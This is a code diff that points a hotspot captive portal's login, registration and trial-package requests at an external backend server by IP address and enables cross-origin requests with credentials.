@@ -400,10 +400,12 @@
             showLoading(true);
             
             try {
-                const res = await fetch('/system/user-auth.php', {
+                const res = await fetch('https://18.156.45.197/system/user-auth.php', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: `action=login&phone=${phone}&password=${password}`
+                    body: `action=login&phone=${phone}&password=${password}`,
+                    mode: 'cors',
+                    credentials: 'include'
                 });
                 
                 const data = await res.json();
@@ -443,10 +445,12 @@
             showLoading(true);
             
             try {
-                const res = await fetch('/system/user-auth.php', {
+                const res = await fetch('https://18.156.45.197/system/user-auth.php', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: `action=register&phone=${phone}&email=${email}&password=${password}&password_confirm=${confirm}`
+                    body: `action=register&phone=${phone}&email=${email}&password=${password}&password_confirm=${confirm}`,
+                    mode: 'cors',
+                    credentials: 'include'
                 });
                 
                 const data = await res.json();
@@ -472,10 +476,12 @@
             
             showLoading(true);
             try {
-                const res = await fetch('/system/hotspot-payment-api.php', {
+                const res = await fetch('https://18.156.45.197/system/hotspot-payment-api.php', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: `phone=${encodeURIComponent(phone)}&package=${encodeURIComponent(JSON.stringify({plan:"Trial 10 Minutes",price:0,duration:"10 minutes",system:"unlimited",usage:"General"}))}&device_mac=${encodeURIComponent(getCookie('mikrotik_mac') || 'aa:bb:cc:dd:ee:ff')}&device_ip=${encodeURIComponent(getCookie('mikrotik_ip') || '0.0.0.0')}&router=hotspot`
+                    body: `phone=${encodeURIComponent(phone)}&package=${encodeURIComponent(JSON.stringify({plan:"Trial 10 Minutes",price:0,duration:"10 minutes",system:"unlimited",usage:"General"}))}&device_mac=${encodeURIComponent(getCookie('mikrotik_mac') || 'aa:bb:cc:dd:ee:ff')}&device_ip=${encodeURIComponent(getCookie('mikrotik_ip') || '0.0.0.0')}&router=hotspot`,
+                    mode: 'cors',
+                    credentials: 'include'
                 });
                 
                 const data = await res.json();
